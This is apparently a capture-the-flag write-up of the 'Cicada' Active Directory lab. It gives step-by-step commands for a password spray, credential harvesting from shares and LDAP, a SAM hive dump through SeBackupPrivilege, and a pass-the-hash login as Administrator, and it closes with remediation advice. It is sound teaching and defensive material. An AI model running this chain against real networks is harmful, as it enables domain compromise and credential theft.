# HTB Writeup: Cicada
### Full Chain: SMB Anonymous Read → Password Spray → Credential Chain → SeBackupPrivilege → Administrator

---

## Executive Summary

| Field | Detail |
|---|---|
| Target | cicada.htb / 10.129.231.149 |
| OS | Windows Server (Active Directory — CICADA-DC) |
| Difficulty | Easy |
| Attack Chain | Anonymous SMB read → HR document credential → SID brute-force → password spray → LDAP enum → DEV share → hardcoded creds → WinRM → SeBackupPrivilege → SAM dump → Pass-the-Hash → Administrator |
| Root Cause | Default password in HR document + hardcoded credentials in script + over-privileged user account |

---

## 1. Reconnaissance

### Port Scanning

```bash
sudo nmap -sV -sC -Pn 10.129.231.149
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
```

**Key findings:**
- Domain: `cicada.htb`, DC hostname: `CICADA-DC.cicada.htb`
- Full Active Directory stack (Kerberos, LDAP, SMB, RPC)
- SMB signing enabled and required
- Clock skew: +7 hours (important for Kerberos attacks)
- OS: Windows Server 2022 (Build 20348)

---

## 2. SMB Enumeration — Anonymous/Guest Access

### Share enumeration with guest account

```bash
crackmapexec smb cicada.htb -u 'guest' -p '' --shares
```

```
Share      Permissions     Remark
-----      -----------     ------
ADMIN$                     Remote Admin
C$                         Default share
DEV                        (no access as guest)
HR         READ            
IPC$       READ            Remote IPC
NETLOGON                   Logon server share
SYSVOL                     Logon server share
```

The `HR` share was readable without authentication — a significant misconfiguration.

### Accessing HR share

```bash
smbclient //cicada.htb/HR
```

```
smb: \> dir
  Notice from HR.txt    A    1266    Wed Aug 28 20:31:48 2024

smb: \> get "Notice from HR.txt"
```

### HR document contents

The file contained a default password for new hires:

```
Dear new hire!

Welcome to Cicada Corp! [...] Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

**Critical finding:** A plaintext default password exposed on an unauthenticated SMB share.

---

## 3. User Enumeration — SID Brute Force

With a password in hand, the next step was to enumerate valid domain usernames. Since guest access was available, SID brute-forcing via MS-RPC was possible:

```bash
lookupsid.py 'cicada.htb/guest'@cicada.htb -no-pass
```

Domain SID: `S-1-5-21-917908876-1423158569-3159038727`

Domain users discovered:

| RID | Username |
|---|---|
| 500 | Administrator |
| 1104 | john.smoulder |
| 1105 | sarah.dantelia |
| 1106 | michael.wrightson |
| 1108 | david.orelious |
| 1601 | emily.oscars |

Extract users to file:

```bash
lookupsid.py 'cicada.htb/guest'@cicada.htb -no-pass \
  | grep 'SidTypeUser' \
  | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```

---

## 4. Password Spray — michael.wrightson

Test the default HR password against all discovered users:

```bash
crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

```
[-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8  STATUS_LOGON_FAILURE
[-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8  STATUS_LOGON_FAILURE
[-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
[+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

`michael.wrightson` had not changed the default password.

---

## 5. LDAP Enumeration — david.orelious Credential

With `michael.wrightson` credentials, LDAP enumeration revealed an additional credential stored in a user's description field:

```bash
ldapdomaindump -u 'cicada.htb\michael.wrightson' \
  -p 'Cicada$M6Corpb*@Lp#nZp!8' cicada.htb
```

Or via CrackMapExec:

```bash
crackmapexec smb cicada.htb \
  -u michael.wrightson \
  -p 'Cicada$M6Corpb*@Lp#nZp!8' \
  --users
```

**Finding:** `david.orelious` had a password stored in his AD description attribute:

```
david.orelious : aRt$Lp#7t*VQ!3
```

---

## 6. DEV Share Access — Hardcoded Credentials in PowerShell Script

With `david.orelious` credentials, the previously inaccessible `DEV` share became readable:

```bash
crackmapexec smb cicada.htb \
  -u david.orelious \
  -p 'aRt$Lp#7t*VQ!3' \
  --shares
```

```
DEV    READ
```

```bash
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
```

```
smb: \> dir
  Backup_script.ps1    A    601    Wed Aug 28 20:28:22 2024

smb: \> get Backup_script.ps1
```

### Script contents

```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
```

**Critical finding:** Hardcoded plaintext credentials for `emily.oscars` stored in a PowerShell backup script on a network share.

---

## 7. WinRM Access — emily.oscars

```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
```

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
60172f9bdd868653a7f319d84bc0e00b
```

### Privilege check

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**Critical finding:** `emily.oscars` has `SeBackupPrivilege` enabled — this privilege allows reading any file on the system regardless of ACLs, including the SAM and SYSTEM registry hives.

---

## 8. Privilege Escalation — SeBackupPrivilege → SAM Dump → Pass-the-Hash

### Why SeBackupPrivilege leads to SYSTEM

`SeBackupPrivilege` was designed to allow backup software to read any file regardless of permissions. An attacker can use `reg save` to export the SAM and SYSTEM registry hives — which contain local account password hashes — bypassing normal filesystem ACL restrictions.

### Step 1 — Export SAM and SYSTEM hives

```powershell
reg save hklm\sam sam
reg save hklm\system system
```

### Step 2 — Download to attacker machine

```powershell
download sam
download system
```

### Step 3 — Extract hashes with secretsdump

```bash
secretsdump.py -sam sam -system system local
```

```
[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Step 4 — Pass-the-Hash as Administrator

```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
c6cb2a149a4007d16bf2ea586753cf37
```

---

## 9. Credential Chain Summary

```
Anonymous SMB → HR share → "Notice from HR.txt"
                              ↓
                   Default password: Cicada$M6Corpb*@Lp#nZp!8
                              ↓
              Password spray → michael.wrightson ✓
                              ↓
              LDAP enum → david.orelious description field
                   Password: aRt$Lp#7t*VQ!3
                              ↓
              DEV share → Backup_script.ps1
                   Hardcoded: emily.oscars : Q!3@Lp#M6b*7t*Vt
                              ↓
              WinRM → emily.oscars (SeBackupPrivilege)
                              ↓
              reg save SAM+SYSTEM → secretsdump
                   Administrator NTLM: 2b87e7c93a3e8a0ea4a581937016f341
                              ↓
              Pass-the-Hash → Administrator ✓
```

---

## 10. Attack Chain Diagram

```
[Attacker]
    │
    │  nmap → AD DC identified (cicada.htb)
    │  crackmapexec guest → HR share readable
    │  smbclient HR → Notice from HR.txt → default password
    │
    │  lookupsid.py guest → 5 domain users enumerated
    │  crackmapexec password spray → michael.wrightson
    │
    │  LDAP enum as michael.wrightson
    │  → david.orelious password in description field
    │
    │  smbclient DEV as david.orelious
    │  → Backup_script.ps1 → emily.oscars credentials
    │
    │  evil-winrm as emily.oscars
    │  → SeBackupPrivilege enabled
    │  → reg save SAM + SYSTEM
    │  → secretsdump → Administrator NTLM hash
    │
    │  evil-winrm Pass-the-Hash as Administrator
    ▼
[SYSTEM / Administrator]
```

---

## 11. Vulnerability Summary

| # | Vulnerability | Location | Impact |
|---|---|---|---|
| 1 | Default password in HR document on unauthenticated SMB share | `\\cicada.htb\HR\Notice from HR.txt` | Initial credential exposure |
| 2 | User did not change default password | `michael.wrightson` AD account | Domain user access |
| 3 | Password stored in AD user description attribute | `david.orelious` LDAP object | Credential disclosure |
| 4 | Hardcoded plaintext credentials in PowerShell script | `\\cicada.htb\DEV\Backup_script.ps1` | emily.oscars credential |
| 5 | SeBackupPrivilege assigned to non-admin user | `emily.oscars` token privileges | SAM/SYSTEM hive extraction |
| 6 | Local Administrator hash reusable via Pass-the-Hash | SAM hive | Full domain controller access |

---

## 12. Remediation Recommendations

### Default Password Policy
- Never distribute default passwords via SMB shares or email.
- Implement a self-service password reset portal for new hires.
- Enforce a password change at first login via Group Policy (`PasswordMustChange` flag).
- Restrict HR share access to HR department only — not guest/anonymous.

### Credential Storage
- Remove passwords from all AD user description attributes immediately — these are readable by any authenticated domain user.
- Implement a secrets manager (CyberArk, HashiCorp Vault, Azure Key Vault) for service account credentials.
- Never store plaintext credentials in PowerShell scripts, batch files, or any files on network shares.
- Use DPAPI or Managed Service Accounts for scheduled tasks and backup scripts.

### SMB Share Hardening
- Disable anonymous/guest SMB access: `Set-SmbServerConfiguration -EnableSMBGuest $false`
- Audit all shares for overly permissive ACLs regularly.
- Apply the principle of least privilege — only the users who need access to a share should have it.

### SeBackupPrivilege
- Audit which accounts hold `SeBackupPrivilege` and `SeRestorePrivilege`.
- These privileges should only be assigned to dedicated backup service accounts, not regular users.
- Use a privileged access workstation (PAW) model — service accounts with elevated privileges should not have interactive logon rights.

### Pass-the-Hash Mitigation
- Enable Protected Users security group for privileged accounts.
- Implement Windows Defender Credential Guard.
- Use unique local Administrator passwords via LAPS (Local Administrator Password Solution).
- Disable NTLM authentication where possible in favor of Kerberos.

---

## 13. References

- [CrackMapExec Documentation](https://www.crackmapexec.wiki/)
- [Impacket — lookupsid.py](https://github.com/fortra/impacket)
- [Impacket — secretsdump.py](https://github.com/fortra/impacket/blob/master/impacket/examples/secretsdump.py)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [SeBackupPrivilege Abuse — HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#sebackupprivilege)
- [Pass-the-Hash — MITRE ATT&CK T1550.002](https://attack.mitre.org/techniques/T1550/002/)
- [CWE-256: Plaintext Storage of a Password](https://cwe.mitre.org/data/definitions/256.html)
- [Microsoft LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)